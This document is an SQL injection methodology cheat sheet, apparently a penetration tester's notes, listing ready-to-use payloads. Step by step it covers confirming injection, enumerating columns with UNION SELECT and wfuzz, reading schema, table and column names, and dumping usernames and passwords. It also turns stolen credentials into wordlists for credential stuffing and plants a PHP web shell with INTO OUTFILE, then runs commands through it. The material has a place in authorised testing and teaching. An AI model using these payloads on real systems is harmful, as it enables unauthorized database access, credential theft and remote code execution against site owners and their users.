# SQLi Methodology

### 1) Confirmation of a potential SQLi

    ' or 1=1 -- -

Alternatively, you can use BurpSuite Intruder with SQLi wordlists as well.

### 2) Find number of columns in the table

Repeat this input until you get a response from the server

    ' UNION SELECT 1 #
    ' UNION SELECT 1,2 #
    ' UNION SELECT 1,2,3 #
    ' UNION SELECT 1,2,3,4 #
    ' UNION SELECT 1,2,3,4,5 #
    ' UNION SELECT 1,2,3,4,5,6 #

Automated

    wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"

### 3) Find DB Version

    ' UNION SELECT 1,2,3,4,5,@@version #

### 4) Find DB names

    ' union select 1,2,3,4,5,concat(schema_name) FROM information_schema.schemata #

### 5) Find tables names (DB=Users)

    ' union SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='Users' #

### 6) Find the columns name of a table (Table=User)

    ' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'User' #

### 7) Dump data (group_concat(username,” | “,password))

    ' union select 1,2,3,4,5,group_concat(username," | ",password) From users.User #

### 8) Create wordlists for credential stuffing attacks

    cat creds | tr "," "\n" | cut -d " " -f 1 > user
    cat creds | tr "," "\n" | cut -d " " -f 3 > pass

Another thing to check in an SQLi is RCE capabilities (file write or OS command execution)

### 1) File write

    SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"

### 2) Execute payload on webserver

    https://target.com/webshell.php?cmd=id

## Various triggers for SQLi

### 1) Single Quote

    '

### 2) Double Quote

    "
